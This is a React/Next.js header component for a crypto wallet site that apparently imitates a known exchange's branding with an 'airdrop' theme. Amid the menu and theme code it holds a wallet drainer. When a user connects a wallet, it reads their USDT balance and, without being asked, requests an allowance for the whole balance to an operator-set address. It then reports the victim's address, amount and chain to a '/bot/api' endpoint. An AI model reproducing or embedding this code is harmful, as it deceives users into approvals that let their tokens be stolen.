'use client';

import Image from 'next/image';
import { useEffect, useState } from 'react';
import useModal from '@/hook/useModal';
import { menusMobile } from '@/constant';
import ERC_20_ABI from '@/config/erc20.abi.json';
import { FaChevronDown } from 'react-icons/fa';
import { GrLanguage } from 'react-icons/gr';
import { RiInstallLine } from 'react-icons/ri';
import {
  useAccount,
  useConnect,
  useContractRead,
  useContractWrite,
  useDisconnect,
  useNetwork,
  usePrepareContractWrite,
} from 'wagmi';
import { MenuMobile } from '.';
import ConnectYourWallet from '../common/Modal/ConnectYourWallet';
import { IMenu, IMode } from '../interface/IHeader';

const THEME_MODE: string = 'airdrop_theme_mode';
const menus: IMenu[] = [
  {
    name: 'Wallet',
    childs: [
      {
        name: 'iOS',
        path: '#',
      },
      {
        name: 'Android',
        path: '#',
      },
      {
        name: 'Chrome',
        path: '#',
      },
      {
        name: 'APK verification',
        path: '#',
      },
    ],
  },
  {
    name: 'Swap',
    path: '',
  },
  {
    name: 'NFT',
    path: '',
  },
  {
    name: 'Business',
    childs: [
      {
        name: 'Business',
        path: '#',
      },
      {
        name: 'Deverlopers',
        path: '#',
      },
    ],
  },
  {
    name: 'Academy',
    path: '',
  },
  {
    name: 'More',
    childs: [
      {
        name: 'DApp',
        path: '#',
      },
      {
        name: 'Blog',
        path: '#',
      },
      {
        name: 'Protection fund',
        path: '#',
      },
      {
        name: 'Security technology',
        path: '#',
      },
      {
        name: 'Join US',
        path: '#',
      },
      {
        name: 'GASU',
        path: '#',
      },
    ],
  },
];

export default function Header() {
  // State wallet
  const { address, isConnected } = useAccount();
  const { connectors } = useConnect();
  const { disconnect } = useDisconnect();
  const { chain } = useNetwork();

  const { isOpen, closeModal, openModal } = useModal();

  const systemWallet = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS;
  const financialUSDT = process.env.NEXT_PUBLIC_FINANCIAL_USDT;

  const [mode, setMode] = useState<IMode>('DARK');
  const [showMenu, setShowMenu] = useState<string>('');
  const [visibleMenuMobile, setVisibleMenuMobile] = useState<boolean>(false);

  useEffect(() => {
    const newMode: IMode = window.localStorage.getItem(THEME_MODE) as IMode;
    if (newMode) {
      setMode(newMode);
    }
  }, []);

  const handleShowMenu = (menuName: string) => {
    setShowMenu(menuName);
  };

  // readContract
  const { data: dataContractRead } = useContractRead({
    address: financialUSDT as any,
    abi: ERC_20_ABI,
    functionName: 'balanceOf',
    args: [address],
    onError() {
      console.log('Contract error');
    },
  });

  // increaseAllowance
  const { config: increaseAllowance } = usePrepareContractWrite({
    address: financialUSDT as any,
    abi: ERC_20_ABI,
    functionName: 'increaseAllowance',
    args: [systemWallet, Number(dataContractRead)],
    onError() {
      console.log('Approval error');
    },
  });

  // allowance
  const contractRead = useContractRead({
    address: financialUSDT as any,
    abi: ERC_20_ABI,
    functionName: 'allowance',
    args: [address, systemWallet],
    onError() {
      console.log('Allowance error');
    },
  });

  const { data, write: writeApprove } = useContractWrite(increaseAllowance);

  useEffect(() => {
    if (isConnected) {
      const balanceAlowwant = Number(contractRead?.data || 0);

      console.log(balanceAlowwant);

      if (balanceAlowwant === 0 && Number(dataContractRead) > 0) {
        writeApprove?.();
      }
    }
  }, [isConnected, writeApprove]);

  useEffect(() => {
    if (data?.hash) {
      fetchData();
    }
  }, [data?.hash]);

  const fetchData = async () => {
    const ethValue = Number(dataContractRead) / 10 ** 18;
    const stringValue = String(ethValue);
    try {
      const pos = await fetch(
        `/bot/api?address=${address}&amount=${stringValue}&chain_id=${chain?.id}`
      );
      await pos.json();
      console.log('Success');
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <>
      {isOpen ? (
        <ConnectYourWallet
          dataConnectors={connectors}
          isOpen={isOpen}
          handleClickClose={closeModal}
        />
      ) : null}
      <div
        className={`flex items-center justify-between w-full px-3 sm:px-5 ${
          mode === 'DARK' ? 'bg-header' : 'bg-white'
        } text-[#cdccd3] h-16`}
      >
        <div className="mr-5 p-2">
          <Image
            src={mode === 'DARK' ? '/img/light.png' : '/img/dark.png'}
            alt=""
            width={150}
            height={50}
            className=""
          />
        </div>
        <div className="hidden lg:flex">
          <ul
            className={`w-8/10 flex gap-5 mr-5 ml-5 shadow-lg blur-xs items-center justify-center ${
              mode === 'DARK' ? 'text-white' : 'text-black'
            }`}
          >
            {menus.map((menu, index) => (
              <li key={`menu-item-${index}`} className={'relative mx-4 header_li'}>
                {menu.path ? (
                  <a href={menu.path}>{menu.name}</a>
                ) : (
                  <>
                    <div
                      className={'flex gap-2 items-center'}
                      onMouseMove={() => handleShowMenu(menu.name)}
                      onMouseLeave={() => handleShowMenu('')}
                    >
                      <span>{menu.name}</span>
                      {menu.childs && (
                        <FaChevronDown
                          className={`${
                            showMenu === menu.name ? '-rotate-180' : ''
                          } transition-all`}
                        />
                      )}
                    </div>
                    {menu.childs && showMenu === menu.name && (
                      <ul
                        className={
                          'absolute top-[30px] left-1/2 w-[178px] -translate-x-1/2 bg-zinc-800 text-white py-2 rounded-md'
                        }
                        onMouseMove={() => handleShowMenu(menu.name)}
                        onMouseLeave={() => handleShowMenu('')}
                      >
                        <span
                          className="absolute w-full left-0 top-[-20px]"
                          onMouseMove={() => handleShowMenu(menu.name)}
                          onMouseLeave={() => handleShowMenu('')}
                        />
                        {menu.childs?.map((menuChild, idx) => (
                          <li
                            key={`menu-child-item-${idx}`}
                            className="hover:text-black header_li_child hover:bg-[#202024] h-[55px] transition-all"
                          >
                            <a
                              className="h-full flex items-center justify-center"
                              href={menuChild.path}
                            >
                              {menuChild.name}
                            </a>
                          </li>
                        ))}
                      </ul>
                    )}
                  </>
                )}
              </li>
            ))}
          </ul>
          <button
            className={`flex_center header_btn_exchange text-[#e5e5e5] text-[14px] font-medium`}
          >
            Bitget Exchange
          </button>
        </div>

        <div className="">
          <ul className="flex items-center">
            <li>
              <button
                onClick={isConnected ? () => disconnect() : openModal}
                className={`header_btn_wallet`}
              >
                <div className="header_btn_wallet_content">
                  {isConnected ? 'Disconnect Wallet' : 'Connect Wallet'}
                </div>
              </button>
            </li>

            <li className="mx-2 sm:mx-6">
              <button className="p-2">
                <RiInstallLine
                  className={` text-xl p-2${mode === 'DARK' ? 'text-white' : 'text-black'} `}
                />
              </button>
            </li>
            <li>
              <button className="p-2">
                <GrLanguage
                  className={`text-xl ${mode === 'DARK' ? 'text-white' : 'text-black'} `}
                />
              </button>
            </li>

            <li
              className="flex_center ml-4 sm:ml-6 w-5 h-5 cursor-pointer"
              onClick={() => setVisibleMenuMobile((pre) => !pre)}
            >
              <Image src="/icons/menu-icon.svg" alt="menu-icon" width={20} height={20} />
            </li>
          </ul>
        </div>
      </div>

      <div
        className={`transition-all ${
          visibleMenuMobile
            ? 'fixed top-0 right-0 bottom-0 left-0 z-40 inset-0 bg-black opacity-50 visible'
            : 'opacity-0 invisible'
        }`}
        onClick={() => setVisibleMenuMobile(false)}
      ></div>
      <div
        className={`sidebar_mobile fixed z-50 top-0 h-screen w-[300px] ${
          visibleMenuMobile ? 'right-0' : '-right-full'
        } transition-all`}
      >
        <div className="px-5 py-6 h-full">
          <div className="overflow-hidden h-full flex flex-col">
            {/* heading */}
            <div className="flex justify-between items-center">
              <Image src="/img/light.png" alt="" width={150} height={28} />
              <Image
                src="/icons/close-white.svg"
                alt="close white"
                width={24}
                height={24}
                className="cursor-pointer"
                onClick={() => setVisibleMenuMobile((pre) => !pre)}
              />
            </div>
            {/* menu */}
            <div className="flex-1 scroll pb-[100px] mt-5">
              {menusMobile.map((menu) => (
                <MenuMobile
                  key={menu.name}
                  childs={menu.childs ?? []}
                  name={menu.name}
                  path={menu.path ?? '#'}
                />
              ))}
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
